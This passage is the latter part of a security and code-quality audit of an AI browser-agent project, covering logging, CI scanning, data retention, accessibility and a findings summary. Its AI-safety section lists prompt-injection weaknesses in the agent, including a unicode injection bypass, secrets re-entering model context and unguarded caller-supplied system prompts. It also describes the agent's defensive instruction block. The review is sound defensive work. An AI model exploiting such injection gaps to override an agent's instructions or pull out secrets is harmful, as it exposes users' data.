- **Strengths (verified):** the root contract tests are high-quality *behavior* tests, not implementation snapshots — `schema-sync.test.ts` (ACTION_METADATA↔schema↔type sync), `transport-http.test.ts` (opaque-redirect/`redirect:"manual"` regression), `llm-protocols.test.ts` (streaming truncation + token accounting), `security.test.ts` (injection defense, domain allow/blocklist with scheme floor, secret redaction), and `cowork-events.test.ts` (auth/CORS/body-limit/rate-limit) are thorough and assert real behavior.

---

## 17. Logging, Monitoring & Tracing

- **F-16 (LOW) — Security-event observability gap in mini-service.** On failed socket.io handshake auth, the connection is simply dropped (`index.ts:645-647`) with no log; HTTP 401s are not logged (only handler-exception `console.error`). SECURITY.md describes a cockpit "security event feed" (`/api/cowork/security/events`), but the mini-service — the actual security boundary — emits no structured security events. *Why it matters:* auth failures / 401 storms are the signals needed to detect token brute-force or misconfiguration; currently silent. *Fix:* log (at least info/warn) failed handshake-auth attempts and repeated 401s with source IP (reuse `clientIp`), optionally surface a security event into the buffer; never log the token.
- **Strengths:** structured `console.error` on handler exceptions; `redactSecrets` applied to on-disk run history (`run-history.ts:101-120`); no secrets logged in cockpit/extension; sensitive data not written to logs in reviewed paths.

---

## 18. Concurrency & Race Conditions

- **N/A – no confirmed data-loss race conditions found in the agent core.** `waitForTakeoverResume` correctly removes both message + abort listeners (`takeover.ts:47-59`, a prior leak now fixed); `LoopDetector` is single-loop state; `persistent-memory`/`scheduled-tasks` use last-write-wins on rare user writes (acceptable, eventually consistent via `onChanged`). The synchronous `runStarting` guard closes the TOCTOU window for concurrent RUN messages (`message-routing.ts:122-126`, `agent-bridge.ts:56-66`), released in `finally`; `saveRunState` preserves a concurrent STOP (`state-store.ts:37-48`).
- **F-19 (Low)** loop-detector state interaction with `pageChanged` reset — see §3.
- **Info caveat:** if the SW process is *hard-killed* (not an exception) while a CDP session is attached, the `finally` detach won't run — mitigated by Chrome's own debugger cleanup on SW exit.

---

## 19. Dependencies & Supply Chain

- **F-31 (MEDIUM) — No automated dependency / security scanning in CI.** `.github/workflows/ci.yml` has only `test` (lint, `tsc`, `vitest`, `build:extension`, sync-check) and `cockpit` (typecheck, lint, build) jobs. No `npm audit`, no SAST, no dependency-review, no coverage gate. With 3 packages and loose caret ranges, vulnerabilities/breaking minors can land silently; no coverage regression signal. *Fix:* add `npm audit --audit-level=high` (per sub-package — root `postinstall` installs cockpit with `--ignore-scripts`, so a root audit alone misses transitive deps), a SAST step (CodeQL/Semgrep), and a `vitest run --coverage` threshold.
- **F-32 (LOW) — `dependabot.yml` absent.** `.github/workflows/` contains only `ci.yml`. No automated dependency updates/vuln alerts. *Fix:* add `.github/dependabot.yml` covering `/`, `/cockpit`, `/mini-services/cowork-events` + a Dependency Review workflow.
- **F-34 (LOW)** `--ignore-scripts` breaks local engine download — see §14.
- **Notable packages (loose ranges, review recommended):** `next: ^16.1.1`, `socket.io: ^4.7.2`, `zod: ^4.4.3`, `@huggingface/transformers: 3.8.1`, `onnxruntime-web: 1.23.0`, `esbuild: ^0.28.1`. **No CVEs were verified in this offline pass** — run `npm audit` before relying on the dependency surface.
- **Strengths:** lockfiles present (`package-lock.json` x3); `overrides: { flatted }` pinned; postinstall chain installs all three packages.

---

## 20. Compliance & Licensing

- **F-35 (LOW) — No deletion/retention mechanism for stored PII.** No `DELETE` handlers exist anywhere under `/api/cowork/*` (`agent-bootstrap.ts:87`: "there are no DELETE endpoints yet"). Browsing history, form autofill (`FormMemory`), chat transcripts (`ChatMessage`), security events, and user emails (`User`) accumulate indefinitely. *Why it matters:* for a tool storing browsing history + form autofill + chat, the absence of any deletion/retention policy is a data-protection gap (e.g., GDPR erasure). `FormMemory` values are additionally rendered in plaintext in `memory-view.tsx`. *Fix:* introduce DELETE/prune endpoints or a retention job (gated behind the token, ideally a distinct admin scope); mask/redact sensitive form fields by default in the UI.
- **F-36 (LOW) — Memory routes return all rows, no limit/pagination.** `memory/site/route.ts:5-10`, `memory/form/route.ts:5-10` fetch the entire table (unlike `security/events`, `history`, `tabs`). `FormMemory` holds autofill values (potential PII/passwords) returned in full. *Fix:* add `parseLimit(req)` + `orderBy`/cursor pagination.
- **F-43 (LOW/Info) — No NOTICE/attribution for bundled third-party code.** Root `LICENSE` is MIT (compatible). Vendors shadcn/ui (MIT, no attribution required), Radix UI, `@huggingface/transformers` (Apache-2.0, used as library dep — no hard NOTICE requirement), and pulls live data from models.dev. *Fix:* add a `THIRD_PARTY_LICENSES`/attribution section enumerating shadcn/ui, Radix UI, HuggingFace transformers, models.dev; confirm the `z-ai-web-dev-sdk` license terms for the AI-proxy usage.
- **Verified:** Password Vault feature was **fully removed** (schema has only a removal note at `schema.prisma:135-141`; no vault route/UI/column) — no plaintext-password regression. `safeHref` (`format.ts:44-53`) blocks `javascript:`/`data:` hrefs.

---

## 21. Internationalization & Accessibility

- **F-38 (LOW) — No i18n; all UI strings hardcoded English** in both the extension (`options/**`, `sidepanel/**`) and cockpit (`components/**` — no `next-intl`/message catalog; only `timeAgo`/`formatBytes` for numbers). Acceptable for a single-language operator tool; flagged per the i18n dimension.
- **F-39 (LOW) — Extension a11y gaps.** `sidepanel/takeover.ts:72-126` password modal sets `role="dialog"`/`aria-modal="true"` but never traps focus nor restores focus to the trigger on close. Status signaled color-only via `.badge`/`data-status` (`lifecycle.ts:67-71`) — fails WCAG 1.4.1 for some users. *Fix:* add focus trap + restoration; ensure non-color text/ARIA status label.
- **F-37 (LOW) — Cockpit data tables use `<th>` without `scope`.** `components/cowork/shared/data-table.tsx:35-42` lacks `scope="col"` and no `<caption>` — screen-reader users lose column/table semantics. *Fix:* add `scope="col"` + visually-hidden `<caption>`/`aria-label`.
- **Strengths:** cockpit sidebar/header are otherwise accessible (`sidebar.tsx:51` `aria-label`, `:74` `aria-current`, `chat-view.tsx:334` `aria-label="Send"`); chat/memory render as React text nodes (auto-escaped, no `dangerouslySetInnerHTML` anywhere).

---

## 22. Build, CI & Deployment

- **F-29 (MEDIUM) — CI sync-check is blind to the compiled extension bundles.** `.github/workflows/ci.yml:43-50` runs `git diff --exit-code -- chrome-extension/`. `.gitignore` contains `chrome-extension/*.js` and `chrome-extension/chunks/` (the esbuild ESM code-split output). In this tree `chrome-extension/` contains only `manifest.json`, `*.html`, `*.css`, `icons/` — no `.js`/`chunks/`. `git diff` only reports differences for *tracked* files, so the regenerated (untracked/ignored) `.js` bundles are never compared. *Why it matters:* the check's stated intent (verify `chrome-extension/` stays in sync with `src/extension/`) is not achieved — a regression in `src/extension/*.ts` regenerates untracked `.js` that `git diff` ignores, so source/artifact drift is invisible. *Fix:* either track the built `chrome-extension/*.js` + `chunks/` (remove those two `.gitignore` lines) so `git diff` covers them, or replace the diff with a real verification (build, assert no diff on tracked files AND that the build succeeded from current source; document that published releases must be rebuilt from the verified commit). Add an artifact-provenance note.
- **F-30 (MEDIUM) — Cockpit has no tests; CI runs none** — see §16.
- **F-31 (MEDIUM) — No dependency/security scanning in CI** — see §19.
- **F-34 (LOW) — `--ignore-scripts` breaks local cockpit runtime** — see §14.
- **Strengths:** root CI lints + `tsc --noEmit` + `vitest` + `build:extension` + sync-check; cockpit CI job runs `db:generate` + `tsc` + `lint` + `next build`. `esbuild.config.ts` is correct (ESM+splitting for SW, IIFE for content/sidepanel/options; vision-assistant correctly code-split via dynamic import; zod-locales stub plugin saves ~600 KB). The cockpit build has **no test gate** (there are no cockpit tests) — the real gap is coverage, not build correctness.

---

## 23. AI / Prompt / Skill Safety

- **F-01 (HIGH)** secret re-extraction into model context — see §8.
- **F-06 (MEDIUM)** unicode prompt-injection bypass — see §8.
- **F-08 (LOW)** `evaluate` arbitrary JS execution / egress — see §4/§8.
- **F-24 (LOW)** injection flagging omits AX tree + history — see §8.
- **F-20 (MEDIUM)** OpenAI structured-output drops schema (worse parse reliability) — see §3.
- **F-28 (LOW)** MCP catalog phantom capabilities — see §7.
- **F-44 (INFO) — `ai/chat` accepts caller-supplied `systemPrompt` + `system` role with no injection guardrails.** `cockpit/src/app/api/cowork/ai/chat/route.ts:19-79` forwards `messages` (incl. `system` role) and `systemPrompt` verbatim to the mini-service LLM; validates roles + enforces 100-message/32KB/16KB caps but performs no sanitization. Inherent to a chat proxy (the LLM must process user content); acceptable for a trusted-operator tool, but worth documenting as out of scope of the proxy's responsibility. *Fix:* if untrusted content is ever mixed into `history`, use a fixed server-side system prompt that cannot be overridden and quarantine untrusted text.
- **Verified strong:** NFKC + zero-width normalization; dual redaction + flagging layers; `<site_memory>` (trusted) protected by being a redacted `PROMPT_TAG`; compacted memory has a dedicated tag stripper; skill/custom-tool blocks user-authored + name-validated (`registry.ts:126`, `CUSTOM_TOOL_NAME_REGEX`); `SECURITY_INSTRUCTION` block enforces content-isolation/instruction-detection/sensitive-data-handling/manipulation-resistance; public agent-discovery routes expose only a static contract (no PII/tokens/DB contents, no unsafe instructions in `AGENT_STARTUP_SEQUENCE`).

---

## 24. Findings Normalization

- **Deduplication applied:** F-03 and the cross-cutting "shared secret in browser" are merged (single finding). F-04 and the mini-service `chat:join` limitation are merged. `bodyJson` swallowing (F-04b) and `withRouteError` raw-message leak (F-04a) are kept distinct but both originate from `cockpit/src/lib/cowork/api/http.ts`. `escapeHtml` (F-10), `getCockpitUrl` (F-13), `evaluate` (F-08) are each reported once. The `dom/` shims appear in §5/§6 as a single intentional-shim note (not dead code, not a bug).
- **Severity normalization:** High = breaks a core guarantee in default config or unbounded spend (F-01, F-02). Medium = real security/correctness weakness exploitable under plausible conditions or clear quality gap (F-03, F-04, F-05, F-06, F-07, F-20, F-21, F-29, F-30, F-31). Low = localized/defense-in-depth/latent. Info = context only.
- **Confidence:** all findings are backed by exact file:line evidence from read-only review; no speculative claims. Where the underlying model/price/runtime behavior could not be verified offline (CVEs, exact repriced rates), confidence is marked `medium` and the remediation is "verify + wire correctly."
- **Cross-cutting themes (owner-ready):**
  1. **Secret/exfiltration surface** — F-01, F-08, F-11, F-12, F-09, F-06 (all converge on "untrusted/LLM-visible data must be sanitized end-to-end, including DOM re-extraction and AX tree").
  2. **Auth-token model** — F-03, F-04, F-05, F-15, F-16 (the single shared secret is over-exposed: in the browser bundle, fail-open on misconfig, not fully constant-time, unlogged on failure).
  3. **CI/observability blind spots** — F-29, F-30, F-31, F-32, F-33, F-34 (sync-check is blind, cockpit untested, no scanning, mini-service success paths untested).
  4. **Cost/pricing correctness** — F-02, F-21, F-20 (catalog override never wired; stale table; schema dropped).
- **Recommended implementation order:** F-01 → F-02 → F-03/F-04 (auth hardening) → F-05/F-41 (deploy safety) → F-20/F-06 (LLM reliability + injection hardening) → F-29/F-30/F-31 (CI trust) → remaining Low items.

**End of report.**
